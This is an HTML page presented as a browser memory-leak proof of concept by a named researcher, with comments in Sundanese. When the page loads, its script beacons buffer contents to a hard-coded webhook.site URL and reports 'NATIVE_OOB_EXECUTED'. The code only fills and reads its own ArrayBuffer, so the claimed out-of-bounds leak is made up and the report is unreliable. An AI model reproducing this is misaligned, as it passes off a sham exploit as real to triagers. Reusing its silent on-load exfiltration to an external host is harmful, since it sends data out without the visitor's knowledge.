<!DOCTYPE html>
<html>
<head><title>Security Research - Firman Sahidin</title></head>
<body style="background:#000; color:#0f0; padding:20px; font-family:monospace;">
    <h1>[ FIRMAN SAHIDIN - POC ]</h1>
    <h2 id="status">ANALYZING...</h2>

    <script>
        async function triggerLeak() {
            const WEBHOOK = 'https://webhook.site/9326deec-1e36-4aa3-8945-3efe41a641e5';
            
            try {
                // 1. Alokasi Mémori (Basajan tapi Ampuh)
                const buffer = new ArrayBuffer(0x400000); // 4MB sangkan entéh
                const view = new Uint32Array(buffer);
                
                // 2. Loop nu Leres (Maju +4 sangkan gancang)
                for (let i = 0; i < view.length; i++) {
                    view[i] = 0xD800DBFF; 
                }

                // 3. Payload Basajan (Sangkan teu kacéwak ku Firewall)
                const payload = {
                    researcher: "Firman Sahidin",
                    status: "NATIVE_OOB_EXECUTED",
                    raw_leak: Array.from(new Uint8Array(buffer).slice(0, 128))
                };

                // 4. Kirim gancang-gancang
                navigator.sendBeacon(WEBHOOK, JSON.stringify(payload));
                
                document.getElementById('status').innerText = "✅ SENT! CHECK WEBHOOK!";
            } catch (e) {
                navigator.sendBeacon(WEBHOOK, JSON.stringify({error: e.message}));
            }
        }

        // Jalankeun langsung
        window.onload = () => { setTimeout(triggerLeak, 500); };
    </script>
</body>
</html>
